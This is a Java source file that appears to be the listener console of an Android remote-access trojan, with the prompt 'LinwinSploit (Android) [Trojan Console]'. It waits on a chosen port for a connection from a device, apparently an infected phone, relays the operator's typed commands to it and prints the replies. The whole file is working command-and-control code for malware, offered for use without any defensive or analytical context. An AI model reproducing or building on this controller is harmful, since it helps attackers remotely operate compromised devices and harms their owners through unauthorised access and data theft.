

import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;

public class Main {
    public static String terminal = "LinwinSploit (Android) [Trojan Console] $ ";
    public static OutputStream outputStream;
    public static InputStream inputStream;
    public static Socket socket;
    public static PrintWriter printWriter;
    public static void main(String[] args) throws Exception {
        ServerSocket serverSocket = new ServerSocket(Integer.parseInt(args[0]));

        System.out.println(" [INFO] Listen the port: "+serverSocket.getLocalPort());
        Socket socket = serverSocket.accept();
        System.out.println();
	OutputStream outputStream = socket.getOutputStream();
        InputStream inputStream = socket.getInputStream();
        PrintWriter printWriter = new PrintWriter(outputStream);

        Main.outputStream = outputStream;
        Main.inputStream = inputStream;
        Main.printWriter = printWriter;
        Main.socket = socket;
        Thread socketThread = new Thread(new Runnable() {
            @Override
            public void run() {
                try {
                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                    System.out.println();
		    while (true) {
                        String message = bufferedReader.readLine();
                        if (message == null) {
                            break;
                        }
			String[] split = message.split("/n");
			for (String i : split) {
				System.out.println(i);
			}
			System.out.println();
			System.out.print(terminal);
			continue;
                        //System.out.print(terminal);
                    }
                    bufferedReader.close();
                    System.out.println("SOCKET EXIT!");
                    socket.close();
                }catch (Exception exception){
                    try {
                        socket.close();
                    } catch (IOException e) {
                        throw new RuntimeException(e);
                    }
                }
            }
        });
        socketThread.start();

        System.out.println("\n Enter 'help' to get help information.");
        Thread inputCommand = new Thread(new Runnable() {
            @Override
            public void run() {
                Scanner scanner = new Scanner(System.in);
                while (true) {
                    //System.out.print(terminal);
                    String command = scanner.nextLine();

                    if (command.equals("exit"))
                        break;
                    if (command.equals("help")) {
                        System.out.println(getFileContent("Help.txt"));
                    	System.out.print(terminal);
		    }

                    else {
                        printWriter.println(command);
                        printWriter.flush();
                    }
                }
                System.out.println("SOCKET CLOSE!");
                try {
                    socket.close();
                } catch (IOException e) {
                    throw new RuntimeException(e);
                }
                System.exit(0);
            }
        });
        inputCommand.start();
    }
    public static String getFileContent(String path) {
        try {
            FileReader fileReader = new FileReader(path);
            BufferedReader bufferedReader = new BufferedReader(fileReader);
            StringBuffer stringBuffer = new StringBuffer("");

            while (true) {
                String line = bufferedReader.readLine();
                if (line == null) {
                    break;
                }
                stringBuffer.append(line);
                stringBuffer.append("\n");
            }
            return stringBuffer.toString();
        }
        catch (Exception exception){
            return null;
        }
    }
}
